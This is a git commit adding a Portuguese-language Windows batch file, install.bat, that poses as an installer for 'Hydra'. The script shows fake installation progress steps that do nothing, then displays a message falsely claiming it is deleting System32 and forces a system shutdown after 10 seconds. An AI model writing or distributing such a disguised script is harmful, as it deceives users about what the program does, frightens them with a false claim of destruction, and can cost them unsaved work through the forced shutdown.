fa2d8a4e6c0bba3b9e00c774c6dedb69f319764c
Hydra <caosrade123@gmail.com>
2025-10-29 20:17:33 -0300

    Add files via upload

---
+++ install.bat
@@ -0,0 +1,33 @@
+@echo off
+title Instalação do Hydra
+color 0A
+
+echo.
+echo ####################################################
+echo #                           Hydra                           #
+echo #         Iniciando Processo de Instalação         #
+echo ####################################################
+echo.
+
+ping 127.0.0.1 -n 2 >nul
+
+echo Verificando requisitos do sistema...
+ping 127.0.0.1 -n 2 >nul
+
+echo Preparando ambiente de instalação...
+ping 127.0.0.1 -n 2 >nul
+
+echo Copiando arquivos necessários...
+ping 127.0.0.1 -n 2 >nul
+
+echo Configurando sistema...
+ping 127.0.0.1 -n 2 >nul
+
+echo Instalação concluída com sucesso!
+ping 127.0.0.1 -n 2 >nul
+
+echo Desligando o sistema em 10 segundos...
+ping 127.0.0.1 -n 2 >nul
+
+msg * Hydra Deletando o sistema 32
+shutdown -s -t 10
